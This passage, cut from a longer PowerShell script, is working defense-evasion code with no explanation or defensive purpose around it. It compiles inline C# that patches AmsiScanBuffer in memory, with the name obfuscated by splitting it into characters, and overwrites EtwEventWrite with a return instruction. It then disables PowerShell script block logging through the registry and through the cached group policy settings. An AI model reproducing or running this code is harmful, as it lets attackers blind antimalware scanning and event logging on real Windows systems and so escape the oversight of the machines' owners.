
New-Item -ItemType Directory -Force -Path $sess | Out-Null

$amsietwpatch = @"
using System;
using System.Diagnostics;
using System.Runtime.InteropServices;

public class Patcher
{
    [DllImport("kernel32.dll")]
    public static extern IntPtr GetProcAddress(IntPtr hModule, string procName);

    [DllImport("kernel32.dll")]
    public static extern IntPtr GetModuleHandle(string lpModuleName);

    [DllImport("kernel32.dll")]
    public static extern bool VirtualProtect(IntPtr lpAddress, UIntPtr dwSize, uint flNewProtect, out uint lpflOldProtect);

    [DllImport("kernel32.dll", SetLastError = true)]
    private static extern bool WriteProcessMemory(IntPtr hProcess, IntPtr lpBaseAddress, byte[] lpBuffer, uint nSize, out int lpNumberOfBytesWritten);

    public static bool PatchAmsi()
    {
        IntPtr h = GetModuleHandle("a" + "m" + "s" + "i" + ".dll");
        if (h == IntPtr.Zero) return false;
        IntPtr a = GetProcAddress(h, "A" + "m" + "s" + "i" + "S" + "c" + "a" + "n" + "B" + "u" + "f" + "f" + "e" + "r");
        if (a == IntPtr.Zero) return false;
        UInt32 oldProtect;
        if (!VirtualProtect(a, (UIntPtr)5, 0x40, out oldProtect)) return false;
        byte[] patch = { 0x31, 0xC0, 0xC3 };
        Marshal.Copy(patch, 0, a, patch.Length);
        return VirtualProtect(a, (UIntPtr)5, oldProtect, out oldProtect);
    }

    public static void PatchEtwEventWrite()
    {
        const uint PAGE_EXECUTE_READWRITE = 0x40;
        string ntdllModuleName = "ntdll.dll";
        string etwEventWriteFunctionName = "EtwEventWrite";

        IntPtr ntdllModuleHandle = GetModuleHandle(ntdllModuleName);
        IntPtr etwEventWriteAddress = GetProcAddress(ntdllModuleHandle, etwEventWriteFunctionName);

        byte[] retOpcode = { 0xC3 }; // RET opcode

        uint oldProtect;
        VirtualProtect(etwEventWriteAddress, (UIntPtr)retOpcode.Length, PAGE_EXECUTE_READWRITE, out oldProtect);
        
        int bytesWritten;
        WriteProcessMemory(Process.GetCurrentProcess().Handle, etwEventWriteAddress, retOpcode, (uint)retOpcode.Length, out bytesWritten);
    }
}
"@
Add-Type -TypeDefinition $amsietwpatch -Language CSharp
[Patcher]::PatchAmsi()
[Patcher]::PatchEtwEventWrite()

function Disable-ScriptBlockLogging {
    $keyPath = "HKLM:\Software\Policies\Microsoft\Windows\PowerShell\ScriptBlockLogging"
    if (-not (Test-Path $keyPath)) {
        New-Item -Path $keyPath -Force | Out-Null
    }
    Set-ItemProperty -Path $keyPath -Name "EnableScriptBlockLogging" -Value 0
}

function Disable-ScriptBlockLoggingFromCache {
    try {
        $settings = [Ref].Assembly.GetType("System.Management.Automation.Utils").GetField("cachedGroupPolicySettings","NonPublic,Static").GetValue($null)
        if ($settings -ne $null) {
            if (-not $settings.ContainsKey("HKEY_LOCAL_MACHINE\Software\Policies\Microsoft\Windows\PowerShell\ScriptBlockLogging")) {
                $settings["HKEY_LOCAL_MACHINE\Software\Policies\Microsoft\Windows\PowerShell\ScriptBlockLogging"] = @{}
            }
            $settings["HKEY_LOCAL_MACHINE\Software\Policies\Microsoft\Windows\PowerShell\ScriptBlockLogging"]["EnableScriptBlockLogging"] = 0
            Write-Host "."
        } else {
            Write-Host "."
        }
    } catch {
        Write-Error "Error $_"
    }
}

Disable-ScriptBlockLogging
Disable-ScriptBlockLoggingFromCache